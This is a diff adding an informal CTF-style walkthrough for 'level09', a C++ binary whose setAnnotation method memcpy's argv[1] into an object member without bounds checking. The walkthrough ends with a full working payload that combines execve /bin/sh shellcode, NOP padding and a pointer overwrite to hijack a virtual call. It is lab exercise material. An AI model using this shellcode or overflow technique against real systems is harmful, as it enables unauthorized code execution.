@@ -1,0 +1,30 @@
+level09
+
+like always we have a binary ./level09 that takes one arg
+
+this time its a cpp program we have a class named N that have a constructor a destructor an operator + and - and a function called setAnnonation
+basically it got at least  2 attributes one of them is annonation char * and also the constructor take a value and store it in another attribute(int)
+
+main :
+we call the constructor twice to create an two objects of N and give 5 as arg for the first one and 6 for the second
+then we call the setAnnotation
+then we dereference the address of the second object twice and call it
+
+setAnnotation:
+it takes an arg char* (argv[1]) , first it use strlen to calcuate thee size of the arg then use memcpy to copy the content of argv[1] to the attribute annotation so basically its a buffer overflow we can overflow the attribute annotation that is created on stack
+
+so we need to overflow the stack in the first object till we arrive to the second object and put the first address +4  on stack that will contain the address of a shell code
+so when we will dereference the first address we will be on first address of stack and when we will dereference it we will be on shell code
+so we will call the shell code
+
+the program sefgfault at 108
+a = address of object
+b = a +4
+c = b+4
+the payload should be somthing like this :
+        4 contain(c)             25(value of c)                     108-29 =79           contian (b)
+ 'address of the shell code'     + 'shellcode'              + pad(till overflow) + 'first address on stack + 4'
+
+this is the final payload:
+
+./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'+ '\x90' *79 + '\x0c\xa0\x04\x08')")
